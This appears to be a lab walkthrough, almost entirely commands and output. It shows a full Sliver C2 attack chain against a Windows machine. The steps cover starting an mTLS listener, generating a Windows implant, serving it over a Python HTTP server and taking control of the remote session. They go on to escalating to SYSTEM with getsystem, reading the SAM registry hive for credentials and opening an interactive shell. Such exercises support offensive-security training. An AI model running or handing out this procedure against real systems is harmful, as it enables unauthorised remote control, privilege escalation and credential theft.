# Step-by-Step Execution

## Phase 1: C2 Deployment
```bash
sliver-server                    # Start Sliver
mtls                             # Create mTLS listener on port 8888
jobs                             # Verify listener is running
```
Phase 2: Implant Generation
```bash
generate --mtls 192.168.56.102 --os windows --arch amd64 --format exe --save /home/joyboy/Desktop/payload.exe
```
Output: payload.exe (15.8 MB)

Phase 3: Payload Delivery
```bash
cd /home/joyboy/Desktop
python3 -m http.server 8000
```
Windows downloads from http://192.168.56.102:8000/payload.exe

Phase 4: Session Establishment
```bash
sessions                         # List active sessions
sessions -i 807a39fb            # Interact with session
whoami                          # CORP\Administrator ✓
```
Phase 5: Privilege Escalation
```bash
getsystem                        # Get SYSTEM privileges
# New SYSTEM session appears: bf12be4b
sessions -i bf12be4b            # Switch to SYSTEM session
```
Phase 6: Post-Exploitation
```bash
# Basic enumeration
whoami                          # NT AUTHORITY\SYSTEM
pwd                             # C:\Users\Administrator\Downloads
ps                              # Process list (includes lsass.exe)
netstat                         # Active connections to C2

# Credential access attempts
registry read --hive HKLM --path "SAM"
shell                           # Interactive Windows shell
```
Commands Executed Summary
Command	Purpose	Result
mtls	Start encrypted listener	✅ Job #1
generate	Create implant	✅ 15.8 MB EXE
sessions	List connections	✅ 8 active
getsystem	Privilege escalation	✅ SYSTEM
ps	Process discovery	✅ lsass.exe found
netstat	Network enumeration	✅ C2 port 8888
